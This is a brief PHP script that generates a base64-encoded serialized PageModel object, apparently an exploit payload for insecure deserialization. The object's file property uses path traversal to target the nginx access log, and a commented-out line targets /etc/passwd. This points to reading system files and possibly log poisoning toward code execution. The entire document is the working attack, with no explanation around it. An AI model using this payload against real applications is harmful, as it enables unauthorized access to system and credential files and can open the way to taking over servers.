<?php

class PageModel {
	// public $file = "/etc/passwd";
	public $file = "/www/../../../var/log/nginx/access.log";
}

echo base64_encode(serialize(new PageModel));

?>
